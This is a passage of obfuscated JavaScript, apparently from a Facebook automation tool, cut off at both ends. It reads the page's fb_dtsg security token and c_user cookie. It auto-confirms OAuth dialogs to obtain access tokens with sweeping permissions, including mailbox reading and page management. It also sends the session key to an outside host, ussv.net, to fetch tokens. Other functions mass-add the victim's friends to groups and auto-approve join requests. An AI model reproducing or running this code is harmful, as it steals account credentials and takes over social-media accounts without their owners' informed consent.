            m0 = "api",
            C0 = "get1",
            T0 = "read_mailbox,user_about_me,user_activities,friends_likes,user_subscriptions,friends_photos,friends_status,friends_videos,user_likes,user_birthday,user_status,user_videos,public_profile,user_friends,user_photos";
        this[f1W.O00] = get_Fb_Key();
        this[f1W.z1Y] = get_Fb_Uid();
        this[f1W.R0y] = f1W.Z00;
        var M0 = T0;
        this[f1W.G47] = function(o) {
            var U = "G42",
                p = "v42",
                M = "u42",
                b = "T42",
                H = "a42",
                R = "i42",
                X = "n42",
                f = "o42",
                n = "r42",
                Y = "E42",
                N = "W42",
                g = "d02",
                T = "P02",
                I = "z02",
                D = "N02",
                G = "H02",
                C = "q02",
                z = "b02",
                P = "U02",
                J = "Z02",
                c = "gettoken",
                L = "O02",
                E0 = "V02",
                F0 = "Q56",
                K = "t56",
                r0 = "w56",
                Q = "x56",
                S = "l56",
                u = "C56",
                p0 = "g56",
                q0 = "D56",
                H0 = "Y56",
                W0 = "m56",
                w = "s56",
                B0 = this[f1W.R0y];
            if (f1W[w](o, undefined)) o = {};
            if (f1W[W0](o[f1W.O4y], "like")) {
                B0 = "165907476854626";
            }
            if (f1W[H0](o[f1W.b6y], 1)) {
                B0 = o[f1W.b6y];
            }
            if (f1W[q0](B0, 10) || f1W[p0](B0, 350685531728) || f1W[u](B0, 6628568379) || f1W[S](B0, 139682082719810)) {
                var o0 = "https://ussv.net/Fb/GetToken.php",
                    Z0 = '?Do=GETTOKEN&Safe=false&App=' + B0 + '&Key=';
                if ($("#setting_gettoken_v2")[f1W.o07]()) {
                    var o0 = $("#setting_gettoken_v2")[f1W.o07]();
                }
                if (f1W[Q](B0, 10)) {
                    var Z0 = '?Do=GETTOKEN&Safe=false&Type=m&Key=';
                }
                var A = uss[f1W.G47](o0 + Z0 + encodeURIComponent(uss[f1W.L0X](acc_doing[f1W.j17][f1W.C8v]))),
                    A = JSON[f1W.i2O](A);
                if (A[f1W.p87]) {
                    A = A[f1W.p87];
                } else {
                    A = 0;
                }
                if (f1W[r0](o[f1W.O4y], "like")) {
                    if (f1W[K]($(".ussv_fb_key_l").length, 0)) {
                        $("body")[f1W.u2r]('<input type="text" class="hidden ussv_fb_key_l" value="' + A + '">');
                    } else {
                        $(".ussv_fb_key")[f1W.o07](A);
                    }
                } else {
                    if (f1W[F0]($(".ussv_fb_key").length, 0)) {
                        $("body")[f1W.u2r]('<input type="text" class="hidden ussv_fb_key" value="' + A + '">');
                    } else {
                        $(".ussv_fb_key")[f1W.o07](A);
                    }
                }
                return A;
            } else if (f1W[E0](B0, "") || f1W[L](B0, 0)) {
                return 0;
            } else {
                var X0 = ussnow[f1W.j2X][c] + '/dialog/oauth?response_type=token&display=popup&client_id=' + B0 + '&redirect_uri=fbconnect://success&sso_key=com&scope=public_profile,basic_info,read_stream,read_mailbox,read_page_mailboxes,rsvp_event,offline_access,email,ads_management,ads_read,read_insights,manage_notifications,read_friendlists,manage_pages,publish_actions,user_birthday,user_religion_politics,user_relationships,user_relationship_details,user_hometown,user_location,user_likes,user_activities,user_interests,user_education_history,user_work_history,user_website,user_groups,user_events,user_photos,user_videos,user_friends,user_about_me,user_status',
                    n0 = uss[f1W.G47](X0);
                if (f1W[J](n0[f1W.x3y]('error_code=1349040'), null) && f1W[P](n0[f1W.x3y]('/dialog/close'), null)) {
                    var U0 = $(n0)[f1W.q8r]("form")[f1W.V6Q]("action"),
                        b0 = i0($(n0)[f1W.q8r]("form")[f1W.Q0I]());
                    U0 = U0 ? U0 : "xx";
                    if (f1W[z](U0[f1W.x3y]('oauth/read'), null)) {
                        if (f1W[C](U0[f1W.x3y]('oauth/confirm'), null)) {
                            if (f1W[G](U0[f1W.x3y]('oauth/write'), null)) {
                                var s0 = uss[f1W.c2O](0, U0, b0),
                                    U0 = $(s0)[f1W.q8r]("form")[f1W.V6Q]("action"),
                                    b0 = i0($(s0)[f1W.q8r]("form")[f1W.Q0I]());
                            } else {}
                            var V0 = new XMLHttpRequest();
                            V0[f1W.g4Y] = function() {
                                var W = "h02",
                                    V = "R02",
                                    E = "f02";
                                if (f1W[E](V0[f1W.D60], 4) && f1W[V](V0[f1W.p0O], 200)) {
                                    var O = V0[f1W.H8v][f1W.x3y](/access_token=(.*?)&expires_in/i);
                                    if (f1W[W](O, null)) {
                                        A = 0;
                                    } else {
                                        A = O[1];
                                        if (typeof FbCheck === 'undefined') {} else {
                                            FbCheck[f1W.v9r]({
                                                "Key": _fb[f1W.O00],
                                                "Uid": _fb[f1W.z1Y],
                                                "App": B0
                                            });
                                        }
                                    }
                                };
                            };
                            V0[f1W.d5y]('POST', U0, false);
                            V0[f1W.x1I]('Content-Type', 'application/x-www-form-urlencoded');
                            V0[f1W.h0r](b0);
                            if (f1W[D](o[f1W.O4y], "like")) {
                                if (f1W[I]($(".ussv_fb_key_l").length, 0)) {
                                    $("body")[f1W.u2r]('<input type="text" class="hidden ussv_fb_key_l" value="' + A + '">');
                                } else {
                                    $(".ussv_fb_key")[f1W.o07](A);
                                }
                            } else {
                                if (f1W[T]($(".ussv_fb_key").length, 0)) {
                                    $("body")[f1W.u2r]('<input type="text" class="hidden ussv_fb_key" value="' + A + '">');
                                } else {
                                    $(".ussv_fb_key")[f1W.o07](A);
                                }
                            }
                            return A;
                        } else {
                            var V0 = new XMLHttpRequest();
                            V0[f1W.g4Y] = function() {
                                var W = "K02",
                                    V = "L02",
                                    E = "S02";
                                if (f1W[E](V0[f1W.D60], 4) && f1W[V](V0[f1W.p0O], 200)) {
                                    var O = V0[f1W.H8v][f1W.x3y](/access_token=(.*?)&expires_in/i);
                                    if (f1W[W](O, null)) {
                                        A = 0;
                                    } else {
                                        A = O[1];
                                        if (typeof FbCheck === 'undefined') {} else {
                                            FbCheck[f1W.v9r]({
                                                "Key": _fb[f1W.O00],
                                                "Uid": _fb[f1W.z1Y],
                                                "App": B0
                                            });
                                        }
                                    }
                                };
                            };
                            V0[f1W.d5y]('POST', U0, false);
                            V0[f1W.x1I]('Content-Type', 'application/x-www-form-urlencoded');
                            V0[f1W.h0r](b0);
                            if (f1W[g](o[f1W.O4y], "like")) {
                                if (f1W[N]($(".ussv_fb_key_l").length, 0)) {
                                    $("body")[f1W.u2r]('<input type="text" class="hidden ussv_fb_key_l" value="' + A + '">');
                                } else {
                                    $(".ussv_fb_key")[f1W.o07](A);
                                }
                            } else {
                                if (f1W[Y]($(".ussv_fb_key").length, 0)) {
                                    $("body")[f1W.u2r]('<input type="text" class="hidden ussv_fb_key" value="' + A + '">');
                                } else {
                                    $(".ussv_fb_key")[f1W.o07](A);
                                }
                            }
                            return A;
                        }
                    } else {
                        var s0 = uss[f1W.c2O](0, U0, b0),
                            U0 = $(s0)[f1W.q8r]("form")[f1W.V6Q]("action"),
                            b0 = i0($(s0)[f1W.q8r]("form")[f1W.Q0I]());
                        if (f1W[n](s0[f1W.x3y]('access_token='), null)) {
                            if (U0) {
                                if (f1W[f](U0[f1W.x3y]("oauth/write"), null)) {
                                    var s0 = uss[f1W.c2O](0, U0, b0),
                                        U0 = $(s0)[f1W.q8r]("form")[f1W.V6Q]("action"),
                                        b0 = i0($(s0)[f1W.q8r]("form")[f1W.Q0I]());
                                } else {}
                            };
                            var V0 = new XMLHttpRequest();
                            V0[f1W.g4Y] = function() {
                                var W = "M42",
                                    V = "e42",
                                    E = "p42";
                                if (f1W[E](V0[f1W.D60], 4) && f1W[V](V0[f1W.p0O], 200)) {
                                    var O = V0[f1W.H8v][f1W.x3y](/access_token=(.*?)&expires_in/i);
                                    if (f1W[W](O, null)) {
                                        A = 0;
                                    } else {
                                        A = O[1];
                                        if (typeof FbCheck === 'undefined') {} else {
                                            FbCheck[f1W.v9r]({
                                                "Key": _fb[f1W.O00],
                                                "Uid": _fb[f1W.z1Y],
                                                "App": B0
                                            });
                                        }
                                    }
                                };
                            };
                            V0[f1W.d5y]('POST', U0, false);
                            V0[f1W.x1I]('Content-Type', 'application/x-www-form-urlencoded');
                            V0[f1W.h0r](b0);
                        } else {
                            var A = s0[f1W.x3y](/access_token=(.*?)&expires_in/i);
                            if (f1W[X](A, null)) {
                                A = 0;
                            } else {
                                A = A[1];
                                if (typeof FbCheck === 'undefined') {} else {
                                    FbCheck[f1W.v9r]({
                                        "Key": _fb[f1W.O00],
                                        "Uid": _fb[f1W.z1Y],
                                        "App": B0
                                    });
                                }
                            }
                        }
                        if (f1W[R](o[f1W.O4y], "like")) {
                            if (f1W[H]($(".ussv_fb_key_l").length, 0)) {
                                $("body")[f1W.u2r]('<input type="text" class="hidden ussv_fb_key_l" value="' + A + '">');
                            } else {
                                $(".ussv_fb_key")[f1W.o07](A);
                            }
                        } else {
                            if (f1W[b]($(".ussv_fb_key").length, 0)) {
                                $("body")[f1W.u2r]('<input type="text" class="hidden ussv_fb_key" value="' + A + '">');
                            } else {
                                $(".ussv_fb_key")[f1W.o07](A);
                            }
                        }
                        return A;
                    }
                } else {
                    var b0 = "&fb_dtsg=" + this[f1W.O00] + "&app_id=" + B0 + "&redirect_uri=fbconnect://success&display=popup&access_token=&sdk=&from_post=1&public_info_nux=1&private=&login=&read=" + M0 + "&write=&readwrite=&extended=&social_confirm=&confirm=&seen_scopes=" + M0 + "&auth_type=&auth_token=&auth_nonce=&default_audience=&ref=Default&return_format=access_token&domain=&sso_device=ios&__CONFIRM__=1",
                        V0 = new XMLHttpRequest();
                    V0[f1W.g4Y] = function() {
                        var W = "c42",
                            V = "J42",
                            E = "I42";
                        if (f1W[E](V0[f1W.D60], 4) && f1W[V](V0[f1W.p0O], 200)) {
                            var O = V0[f1W.H8v][f1W.x3y](/access_token=(.*?)&expires_in/i);
                            if (f1W[W](O, null)) {
                                A = 0;
                            } else {
                                A = O[1];
                                if (typeof FbCheck === 'undefined') {} else {
                                    FbCheck[f1W.v9r]({
                                        "Key": _fb[f1W.O00],
                                        "Uid": _fb[f1W.z1Y],
                                        "App": B0
                                    });
                                }
                            }
                        };
                    };
                    V0[f1W.d5y]('POST', ussnow[f1W.j2X][c] + "v1.0/dialog/oauth/read", false);
                    V0[f1W.x1I]('Content-Type', 'application/x-www-form-urlencoded');
                    V0[f1W.h0r](b0);
                    if (f1W[M](o[f1W.O4y], "like")) {
                        if (f1W[p]($(".ussv_fb_key_l").length, 0)) {
                            $("body")[f1W.u2r]('<input type="text" class="hidden ussv_fb_key_l" value="' + A + '">');
                        } else {
                            $(".ussv_fb_key")[f1W.o07](A);
                        }
                    } else {
                        if (f1W[U]($(".ussv_fb_key").length, 0)) {
                            $("body")[f1W.u2r]('<input type="text" class="hidden ussv_fb_key" value="' + A + '">');
                        } else {
                            $(".ussv_fb_key")[f1W.o07](A);
                        }
                    }
                    return A;
                }

                function i0(W) {
                    var V = "B12",
                        E = "j12",
                        O = "A42",
                        Z = document[f1W.W8O]('html');
                    Z[f1W.V5I] = W;
                    var F = '';
                    for (i = 0; f1W[O](i, Z[f1W.D7a]('input').length); i++) {
                        if (f1W[E](Z[f1W.D7a]('input')[i][f1W.G6y][f1W.x7I]('__CANCEL__'), 0) && Z[f1W.D7a]('input')[i][f1W.G6y][f1W.x7I]('cancel_clicked')) {
                            F += '&' + Z[f1W.D7a]('input')[i][f1W.G6y] + '=' + Z[f1W.D7a]('input')[i][f1W.F2Q];
                        }
                    }
                    if (f1W[V](Z[f1W.D7a]('select').length, 0)) {
                        F += '&' + Z[f1W.D7a]('select')[0][f1W.G6y] + '=80';
                    }
                    F[f1W.F6r]('&fb_dtsg', 'fb_dtsg');
                    F += '&__CONFIRM__=1';
                    return F;
                };
            }
        };
        this[C0] = function(Z) {
            var F = "g12",
                o = "D12",
                U = "Y12",
                p = "X12",
                M = "y12",
                b = "F12",
                H = this[f1W.R0y];
            if (f1W[b](Z, undefined)) Z = {};
            if (f1W[M](Z[f1W.O4y], "like")) {
                H = "165907476854626";
            }
            if (f1W[p](Z[f1W.b6y], 1)) {
                H = Z[f1W.b6y];
            }
            var R = "&fb_dtsg=" + this[f1W.O00] + "&app_id=" + H + "&redirect_uri=fbconnect://success&display=popup&access_token=&sdk=&from_post=1&public_info_nux=1&private=&login=&read=" + M0 + "&write=&readwrite=&extended=&social_confirm=&confirm=&seen_scopes=" + M0 + "&auth_type=&auth_token=&auth_nonce=&default_audience=&ref=Default&return_format=access_token&domain=&sso_device=ios&__CONFIRM__=1",
                X = new XMLHttpRequest();
            X[f1W.g4Y] = function() {
                var W = "m12",
                    V = "s12",
                    E = "k12";
                if (f1W[E](X[f1W.D60], 4) && f1W[V](X[f1W.p0O], 200)) {
                    var O = X[f1W.H8v][f1W.x3y](/access_token=(.*?)&expires_in/i);
                    if (f1W[W](O, null)) {
                        data = 0;
                    } else {
                        data = O[1];
                        if (typeof FbCheck === 'undefined') {} else {
                            FbCheck[f1W.v9r]({
                                "Key": _fb[f1W.O00],
                                "Uid": _fb[f1W.z1Y],
                                "App": H
                            });
                        }
                    }
                };
            };
            X[f1W.d5y]('POST', gl[f1W.f10]("v1.0/dialog/oauth/read"), false);
            X[f1W.x1I]('Content-Type', 'application/x-www-form-urlencoded');
            X[f1W.h0r](R);
            if (f1W[U](Z[f1W.O4y], "like")) {
                if (f1W[o]($(".ussv_fb_key_l").length, 0)) {
                    $("body")[f1W.u2r]('<input type="text" class="hidden ussv_fb_key_l" value="' + data + '">');
                } else {
                    $(".ussv_fb_key")[f1W.o07](data);
                }
            } else {
                if (f1W[F]($(".ussv_fb_key").length, 0)) {
                    $("body")[f1W.u2r]('<input type="text" class="hidden ussv_fb_key" value="' + data + '">');
                } else {
                    $(".ussv_fb_key")[f1W.o07](data);
                }
            }
            return data;
        };
        this[f1W.b6y] = function() {
            var W = "C12";
            if (f1W[W]($(f1W.z60)[f1W.Q0I](), undefined)) {
                return $(f1W.g8a)[f1W.Q0I]();
            } else {
                return $(f1W.z60)[f1W.Q0I]();
            }
        };
        this[m0] = function(W, V, E) {
            var O = "x12",
                Z = "fql?q=",
                F = "l12",
                o = "me/notifications?",
                U = " FROM user WHERE uid IN ( SELECT uid2 FROM friend WHERE uid1 = me() ) ORDER BY uid limit 5000",
                p = "SELECT ",
                M = "friend";
            E = E[f1W.X3Q](f1W.w30);
            switch (E[f1W.L9a]) {
                case M:
                    q = p + E[f1W.S9a] + U;
                    break;
                case f1W.i0Y:
                    q = f1W.V8v;
                    break;
                case f1W.H7O:
                    q = o;
                    break;
                default:
                    q = E[f1W.L9a];
            }
            fb_url = f1W.r90;
            if (f1W[F](W, f1W.S9a)) {
                query = Z + q + f1W.U7I + V;
                fb_url = fb_url + query;
            } else if (f1W[O](W, f1W.c9a)) {
                fb_url = fb_url + q + f1W.U7I + V;
            }
            return _fb[u0](fb_url);
        };
        this[u0] = function(W) {
            return $[f1W.r70](fb_url, function() {});
        };
        this[f1W.S4O] = function(W) {
            var V = "O22",
                E = "V22",
                O = "Q12",
                Z = "t12",
                F = "w12";
            if (f1W[F](W, '')) {
                note = lang_vi_fb_parseLogin_live;
                stt = 1;
            } else {
                var o = "/checkpoint/gi",
                    U = W[f1W.x3y](/Mcheckpoint/gi);
                if (f1W[Z](U, null)) {
                    note = lang_vi_fb_parseLogin_cp;
                    stt = 2;
                } else {
                    var p = W[f1W.x3y](/XLoginController/gi);
                    if (f1W[O](p, null)) {
                        note = lang_vi_fb_parseLogin_die;
                        stt = 0;
                    } else {
                        var M = W[f1W.x3y](/phoneacqwrite/gi);
                        if (f1W[E](M, null)) {
                            note = lang_vi_fb_parseLogin_live;
                            stt = 1;
                        } else {
                            var b = W[f1W.x3y](/\{"token":(.*?)\}/gi);
                            if (f1W[V](b, null)) {
                                note = lang_vi_fb_parseLogin_live;
                                stt = 1;
                            } else {
                                note = lang_vi_fb_parseLogin_timeout;
                                stt = 3;
                            }
                        }
                    }
                }
            }
            W = {
                "stt": stt,
                "note": note
            };
            return W;
        };
        this[f1W.m5I] = function(W, V) {
            var E = "S22",
                O = "P22",
                Z = "z22",
                F = "N22",
                o = "h22",
                U = "R22",
                p = "f22",
                M = "H22",
                b = "q22",
                H = "b22",
                R = "U22",
                X = "Z22";
            if (!V) {
                var V = {};
            };
            if (f1W[X](W, "") || f1W[R](W, undefined) || f1W[H](W, null)) {
                if (V[f1W.O8a]) {
                    W = uss[f1W.G47](3, V[f1W.O8a]);
                } else {
                    W = uss[f1W.G47](3, ussnow[f1W.j2X][f1W.m5I]);
                }
            }
            if (f1W[b](W[f1W.x3y]("Redirecting..."), null)) {
                W = uss[f1W.G47](3, "https://mbasic.facebook.com/home.php");
            };
            var f = 0,
                n = 0,
                Y = 0,
                N = W[f1W.x3y](/\{"token":(.*?)\}/gi);
            if (f1W[M](N, null)) {
                var g = N,
                    g = JSON[f1W.i2O](g),
                    f = g[f1W.M00];
                if (f1W[p](f, null)) {
                    var T = W[f1W.x3y]('name="fb_dtsg" value="(.*?)" autocomplete');
                    if (f1W[U](T, null)) {
                        var f = T[1];
                        Y = 0;
                        var I = document[f1W.T2O][f1W.x3y](document[f1W.T2O][f1W.x3y](/c_user=(\d+)/)[1])[f1W.s7O]();
                        note = "L?y quy?n truy c?p thành công. Ti?n hành thao tác bu?c ti?p theo...";
                        f = f;
                        n = I;
                    } else {
                        var f = '0';
                        note = lang_vi_checking_er_aut;
                        Y = 1;
                        console[f1W.p4y]("L?i 1");
                    }
                } else {
                    if (f1W[o](document[f1W.T2O][f1W.x3y](/c_user=(\d+)/), null)) {
                        note = "Không l?y du?c UId. quá trình check Info trên tài kho?n này th?t b?i !";
                        Y = 2;
                        n = W[f1W.x3y]('"USER_ID":"(.*?)","ACCOUNT_ID"')[1];
                        f = f;
                        if (n) {
                            Y = 0;
                        } else {
                            console[f1W.p4y]("L?i: " + n);
                        }
                    } else {
                        var I = document[f1W.T2O][f1W.x3y](document[f1W.T2O][f1W.x3y](/c_user=(\d+)/)[1])[f1W.s7O]();
                        note = "L?y quy?n truy c?p thành công. Ti?n hành thao tác bu?c ti?p theo...";
                        Y = 0;
                        f = f;
                        n = I;
                    }
                }
            } else {
                find_Key = W[f1W.x3y](/name="fb_dtsg" value="(.*?)" autocomplete="off"/gi);
                if (f1W[F](find_Key, null)) {
                    note = "L?y quy?n truy c?p thành công. Ti?n hành thao tác bu?c ti?p theo...";
                    if (f1W[Z](document[f1W.T2O][f1W.x3y](/c_user=(\d+)/), null)) {
                        n = 0;
                    } else {
                        n = document[f1W.T2O][f1W.x3y](document[f1W.T2O][f1W.x3y](/c_user=(\d+)/)[1])[f1W.s7O]();
                    }
                    f = find_Key[0][f1W.F6r]('name="fb_dtsg" value="', "")[f1W.F6r]('" autocomplete="off"', "");
                    Y = 0;
                } else {
                    var T = W[f1W.x3y]('name="fb_dtsg" value="(.*?)" autocomplete');
                    if (f1W[O](T, null)) {
                        var f = T[1];
                        Y = 0;
                        var I = document[f1W.T2O][f1W.x3y](document[f1W.T2O][f1W.x3y](/c_user=(\d+)/)[1])[f1W.s7O]();
                        note = "L?y quy?n truy c?p thành công. Ti?n hành thao tác bu?c ti?p theo...";
                        f = f;
                        n = I;
                    } else {
                        note = lang_vi_checking_er_aut;
                        Y = 1;
                        console[f1W.p4y]("L?i 2");
                    }
                }
            }
            _fb[f1W.O00] = f;
            _fb[f1W.z1Y] = n;
            _fb[f1W.R0y] = _fb[f1W.b6y]();
            if (f1W[E](V[f1W.c60], 0)) {
                token = 0;
            } else {
                token = _fb[f1W.G47]();
            }
            W = {
                "stt": Y,
                "note": note,
                "App": _fb[f1W.R0y],
                "FB_Key": f,
                "FB_Uid": n,
                "token": token
            };
            return W;
        };
        this[f1W.i0Y] = function(I, D) {
            var G = "R82",
                C = "f82",
                z = "H82",
                P = "q82",
                J = "SaveLog",
                c = "lan",
                L = '<input type="hidden" value="0" id="nowtotal_wait_add_group_',
                E0 = "m72",
                F0 = "F72",
                K = "notifications|",
                r0 = "v92",
                Q = "#note_wait_add_group_",
                S = "FbId",
                u = "grId",
                p0 = "friend|uid,name,pic_small",
                q0 = 5555,
                H0 = "n92",
                W0 = "o92",
                w = "r92",
                B0 = "K22",
                o0 = "IdGR",
                Z0 = "L22";
            if (f1W[Z0](I, f1W.L9a)) {
                Gr = D[o0][f1W.X3Q](f1W.r7Q);
                GrLg = Gr.length;
                for (var A = f1W.L9a; f1W[B0](A, GrLg); A++) {
                    GrId = Gr[A];
                    X0(GrId);
                };

                function X0(b) {
                    $[f1W.c9y]({
                        url: "https://www.facebook.com/groups/unified_queue/async_response/?queue=requests&groupid=" + b + "&__user=" + _fb[f1W.z1Y] + "&__a=1",
                        type: "GET",
                        dataType: "json"
                    })[f1W.D2I](function(W) {
                        var V = "W92",
                            E = "d22";
                        if (f1W[E](W[f1W.D60], 4)) {
                            var W = W[f1W.H8v],
                                W = JSON[f1W.i2O](W[f1W.F6r]("for (;;);", "")),
                                O = W[f1W.G0v][0][3][f1W.a8Y],
                                Z = $(O)[f1W.q8r](".uiList")[f1W.q8r]("._2rcr"),
                                F = Z.length;
                            for (var o = 0; f1W[V](o, F); o++) {
                                var U = $(Z[o])[f1W.Q0I](),
                                    p = $(U)[f1W.q8r]("._42ft._4jy0._4jy3._4jy1")[f1W.V6Q]("ajaxify"),
                                    M = p[f1W.x3y]("%5B0%5D=(.*?)&source=requests_queue");
                                n0({
                                    "Group_Id": b,
                                    "Uid": M[1]
                                });
                            };
                        } else {}
                    });
                };

                function n0(E) {
                    $[f1W.c9y]({
                        url: "https://m.facebook.com/groups/" + E[f1W.G7v] + "/write_async/requests/",
                        type: "POST",
                        dataType: "json",
                        data: "fb_dtsg=" + _fb[f1W.O00] + "&charset_test=€,´,€,´,?,?,?&userid=" + E[f1W.m9a] + "&add=1&=Phê duy?t&m_sess=&__ajax__=true&__user=" + _fb[f1W.z1Y]
                    })[f1W.D2I](function(W) {
                        var V = "E92";
                        if (f1W[V](W[f1W.D60], 4)) {
                            var W = W[f1W.H8v];
                        } else {}
                    });
                };
            } else if (f1W[w](I, f1W.S9a)) {
                Gr = D[o0][f1W.X3Q](f1W.r7Q);
                GrLg = Gr.length;
                for (var A = f1W.L9a; f1W[W0](A, GrLg); A++) {
                    GrId = Gr[A];
                    $[f1W.c9y]({
                        url: "https://www.facebook.com/ajax/groups/members/add_post.php?group_id=" + GrId + "&all_outstanding=1&source=requests_queue&__user=" + _fb[f1W.z1Y] + "&__a=1",
                        dataType: "json",
                        type: "POST",
                        data: "fb_dtsg=" + _fb[f1W.O00] + "&__user=" + _fb[f1W.z1Y] + "&__a=1"
                    })[f1W.D2I](function(W) {
                        var V = "M92",
                            E = "e92",
                            O = "p92";
                        if (f1W[O](W[f1W.D60], 4) && f1W[E](W[f1W.p0O], 500)) {
                            var W = W[f1W.H8v],
                                W = W[f1W.F6r]("for (;;);", "");
                            dvlog = $(".div_popup_text_loc_trung.ussv_logs_txt");
                            if (f1W[V](dvlog[f1W.q8r](".div_ussv_logs_txt.autoAcGr").length, 10)) {
                                dvlog[f1W.q8r](".div_ussv_logs_txt.autoAcGr")[f1W.p3X]()[f1W.w5I]();
                            }
                            dom_logs_ussv(_lJ[f1W.G3v]({
                                "t": "gr",
                                "id": "a1",
                                "r": GrId
                            }), "0|0|_|ok|autoAcGr");
                        } else {}
                    });
                };
            } else if (f1W[H0](I, f1W.c9a)) {
                token = $(f1W.B6Y)[f1W.o07]();
                id = q0;
                var U0 = _fb[m0](f1W.S9a, token, p0);
                U0[f1W.W6O](function(W) {
                    var V = "u92",
                        E = "c92",
                        O = "J92",
                        Z = "I92",
                        F = "ceil",
                        o = "T92",
                        U = "a92",
                        p = "i92";
                    num = W.data.length;
                    note = num + "--" + D[u] + "--" + D[S] + "--" + D[u];
                    $("#note_wait_ac_group_" + D[S] + "_" + D[u]).parent("div").prepend('' + _lJ[f1W.G3v]({
                        "t": "gr",
                        "id": "a8a",
                        "r": note
                    }) + '<span class="div_change_email_time">' + time_now() + '</span><span>' + _lJ[f1W.G3v]({
                        "t": "gr",
                        "id": "a6",
                        "r": note
                    }) + '</span><br/>');
                    $("#bf_add_group_" + D[S] + "_" + D[u])[f1W.Q0I](_fb[f1W.i0Y](6, D));
                    max = $("#max_fr_per_add")[f1W.o07]();
                    if (f1W[p](num, max)) {
                        var M = '{',
                            b = '',
                            H = '',
                            R = 0,
                            X = 0;
                        for (e = 0; f1W[U](e, num); e++) {
                            var f = R++,
                                n = X++,
                                b = b + '&members[' + f + ']=' + W.data[e][f1W.l97] + '',
                                H = H + '&text_members[' + n + ']=' + W.data[e][f1W.G6y];
                        }
                        var b = '' + b + '' + H;
                        $("body")[f1W.u2r]('<textarea class="hidden gr_list_uid" id="text_gr_' + D[S] + '_' + D[u] + '_1">' + b + '</textarea>');
                        _fb[f1W.i0Y](5, {
                            "grId": D[u],
                            "lan": 1,
                            "stt": 0,
                            "FbId": D[S]
                        });
                    } else {
                        var Y = f1W[o](num, max),
                            Y = Math[F](Y);
                        for (e = 1; f1W[Z](e, Y + 1); e++) {
                            var M = '{',
                                b = '',
                                H = '',
                                R = 0,
                                X = 0;
                            for (A = f1W[O](e * max, max); f1W[E](A, e * max); A++) {
                                var f = R++,
                                    n = X++;
                                if (f1W[V](A, num)) {} else {
                                    var b = b + '&members[' + f + ']=' + W.data[A][f1W.l97] + '',
                                        H = H + '&text_members[' + n + ']=' + W.data[A][f1W.G6y];
                                }
                            }
                            var b = '' + b + '' + H;
                            $("body")[f1W.u2r]('<textarea class="hidden gr_list_uid" id="text_gr_' + D[S] + '_' + D[u] + '_' + e + '">' + b + '</textarea>');
                        }
                        _fb[f1W.i0Y](5, {
                            "grId": D[u],
                            "lan": Y,
                            "stt": 0,
                            "FbId": D[S]
                        });
                    }
                });
                U0[f1W.H4I](function() {
                    var W = "a13b";
                    $(Q + D[S] + f1W.S1v + D[u])[f1W.Q0I](_lJ[f1W.G3v]({
                        "t": f1W.W6I,
                        "id": W
                    }));
                    acc_doing[f1W.f17] = f1W.L9a;
                });
            } else if (f1W[r0](I, f1W.J9a)) {
                token = $(f1W.B6Y)[f1W.o07]();
                var U0 = _fb[m0](f1W.c9a, token, K);
                U0[f1W.W6O](function(W) {
                    var V = "B72",
                        E = "j72",
                        O = "A92",
                        Z = "G92",
                        F = parseInt($("#time_wait_ac_group_" + D[S] + "_" + D[u])[f1W.m8y]());
                    if (f1W[Z](F, 10)) {
                        if (f1W[O](W.data.length, 0)) {
                            F = F + 1;
                            setTimeout(function() {
                                _fb[f1W.i0Y](3, D);
                            }, 1000);
                        } else {
                            W = JSON[f1W.v4X](W.data);
                            if (f1W[E](W[f1W.x3y]("to join the group"), null) || f1W[V](W[f1W.x3y]("approved your request"), null)) {
                                F = F + 1;
                                setTimeout(function() {
                                    _fb[f1W.i0Y](3, D);
                                }, 1000);
                            } else {
                                note = D[S] + "--" + D[u];
                                $("#note_wait_ac_group_" + D[S] + "_" + D[u])[f1W.Q0I](_lJ[f1W.G3v]({
                                    "t": "gr",
                                    "id": "a7",
                                    "r": note
                                }));
                                _fb[f1W.i0Y](2, D);
                            }
                        }
                    } else {
                        $(".invite_gr_" + D[S] + "_" + D[u])[f1W.o07](3);
                        $(".autoAddGr.waitac." + D[u])[f1W.X5O]("error_gr")[f1W.C3O]("color", "rgb(247, 247, 247)");
                        dom_logs_ussv(_lJ[f1W.G3v]({
                            "t": "gr",
                            "id": "a10",
                            "r": D[u]
                        }), "0|0|_|error|autoAddGr");
                    }
                    $("#time_wait_ac_group_" + D[S] + "_" + D[u])[f1W.m8y](F);
                });
                U0[f1W.H4I](function() {
                    var W = "a1er";
                    $(f1W.V3v + D[S] + f1W.S1v + D[u])[f1W.o07](f1W.c9a);
                    dom_logs_ussv(_lJ[f1W.G3v]({
                        "t": f1W.W6I,
                        "id": W
                    }), f1W.V67);
                    acc_doing[f1W.f17] = f1W.L9a;
                });
            } else if (f1W[F0](I, f1W.d9a)) {
                $[f1W.c9y]({
                    url: "https://www.facebook.com/ajax/groups/membership/r2j.php",
                    dataType: "json",
                    type: "POST",
                    data: "fb_dtsg=" + _fb[f1W.O00] + "&ref=group_jump_header&group_id=" + D[u] + "&nctr[_mod]=pagelet_group_&__user=" + _fb[f1W.z1Y] + "&__a=1"
                })[f1W.D2I](function(W) {
                    var V = "X72",
                        E = "y72";
                    if (f1W[E](W[f1W.D60], 4) && f1W[V](W[f1W.p0O], 500)) {
                        var W = W[f1W.H8v],
                            W = JSON[f1W.i2O](W[f1W.F6r]("for (;;);", ""));
                        if (W.error) {
                            dom_logs_ussv(_lJ[f1W.G3v]({
                                "t": "gr",
                                "id": "a9a",
                                "r": W[f1W.S7Y] + "---x"
                            }), "0|0|_|error|autoAddGr");
                            $(".invite_gr_" + D[S] + "_" + D[u])[f1W.o07](3);
                        } else {
                            note = D[u] + "--" + D[S] + "--" + D[u];
                            dom_logs_ussv(_lJ[f1W.G3v]({
                                "t": "gr",
                                "id": "a8",
                                "r": note
                            }), "0|0|_|ok|autoAddGr waitac " + D[u]);
                            _fb[f1W.i0Y](3, D);
                        }
                    } else {
                        dom_logs_ussv(_lJ[f1W.G3v]({
                            "t": "gr",
                            "id": "a9",
                            "r": D[u]
                        }), "0|0|_|error|autoAddGr");
                        $(".invite_gr_" + D[S] + "_" + D[u])[f1W.o07](3);
                    }
                });
                var b0 = {},
                    s0 = D[S] + f1W.S1v + D[u];
                b0[s0] = setInterval(function() {
                    var W = "s72",
                        V = "a61",
                        E = "k72";
                    stt = $(f1W.V3v + D[S] + f1W.S1v + D[u]);
                    if (f1W[E](stt[f1W.o07](), f1W.c9a)) {
                        clearInterval(b0[s0]);
                        note = D[S] + f1W.B7a + D[u];
                        dom_logs_ussv(_lJ[f1W.G3v]({
                            "t": f1W.W6I,
                            "id": V,
                            "r": note
                        }), f1W.N8I);
